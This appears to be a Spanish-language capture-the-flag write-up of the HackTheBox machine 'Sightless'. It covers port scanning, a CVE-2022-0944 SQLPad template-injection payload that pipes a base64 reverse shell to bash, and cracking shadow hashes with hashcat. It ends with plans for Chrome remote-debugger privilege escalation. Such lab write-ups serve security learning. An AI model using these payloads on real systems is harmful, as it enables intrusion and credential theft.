<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sightless</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Sightless</h1><br/><p>Escaneo de puertos </p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN sightless_scan 10.10.11.32</strong></p><p></p><p><img src="images/127-1.png" alt="images/127-1.png" /></p><p></p><p>Encuentro este subdominio en un button</p><p></p><p>	<strong>sqlpad.sightless.htb</strong></p><p>	</p><p><img src="images/127-2.png" alt="images/127-2.png" /></p><p></p><p>Para acceder al servicio FTP necesito SSL (Secure Socket Layer)</p><p></p><p><img src="images/127-3.png" alt="images/127-3.png" /></p><p></p><p>Encuentro la versión de SQLPad</p><p></p><p>	<img src="images/127-4.png" alt="images/127-4.png" /></p><p>	</p><p>CVE-2022-0944 - Docker Shell</p><p></p><p><img src="images/127-5.png" alt="images/127-5.png" /></p><p></p><p>Introducimos en database el reverse shell en base 64 </p><p></p><p><img src="images/127-6.png" alt="images/127-6.png" />	</p><p>	</p><p>	{{ process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo reverse_encoded=|</p><p>	 base64 -d|bash&#39;) }}</p><p></p><p>En new connection introducimos los parámetros</p><p></p><p><img src="images/127-7.png" alt="images/127-7.png" /></p><p></p><p><img src="images/127-8.png" alt="images/127-8.png" /></p><p></p><p><img src="images/127-9.png" alt="images/127-9.png" /></p><p></p><p><img src="images/127-10.png" alt="images/127-10.png" /></p><p></p><p>Obtenemos el reverse y estamos como root</p><p></p><p><img src="images/127-11.png" alt="images/127-11.png" /></p><p></p><p>En el directorio home tenemos 2 users</p><p></p><p><img src="images/127-12.png" alt="images/127-12.png" /></p><p></p><p>Tras hacer footprint veo que puedo ver el archivo shadow y el archivo shadow</p><p>Por lo que puedo  intentar crackear las contraseñas  del usuario Michael</p><p></p><p><img src="images/127-13.png" alt="images/127-13.png" /></p><p></p><p><img src="images/127-14.png" alt="images/127-14.png" /></p><p></p><p>Con  hashcat lo crackeo y consigo la pass del user michael</p><p></p><p>	<strong>hashcat -m 1800 -a 0 shadow-hash.txt /usr/share/wordlists/rockyou.txt</strong></p><p></p><p>Con la contraseña y el usuario podemos acceder como usuario a través de ssh</p><p></p><p><img src="images/127-15.png" alt="images/127-15.png" /></p><p></p><p>Tenemos el usuario john</p><p></p><p>Pasamos linpeas.sh para buscar una escalada de privilegios </p><p></p><p>Vemos los procesos que se ejecutan como el usuario john </p><p></p><p><img src="images/127-16.png" alt="images/127-16.png" /></p><p></p><p><img src="images/127-17.png" alt="images/127-17.png" /></p><p></p><p>Tiene el parámetro --remote-debugging-port=0 por lo que el puerto se pone al azar</p><p></p><p>Usaré el proceso home/john/automation/chromedriver --port=51801</p><p></p><p>Según esto hay que hacer un portforwarding</p><p></p><p><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/">Chrome Remote Debugger Pentesting | Exploit Notes (hdks.org)</a></p><p></p><p><img src="images/127-18.png" alt="images/127-18.png" /></p><p></p><p>Ahora se pasará a un puerto random</p><p></p><p><img src="images/127-19.png" alt="images/127-19.png" /></p><p></p><p>Usaremos Metasploit para hacer debugging</p><p></p><p></p><p></p><p><img src="images/127-20.png" alt="images/127-20.png" /></p><p></p><p></p><p></p></div>
</body>
</html>
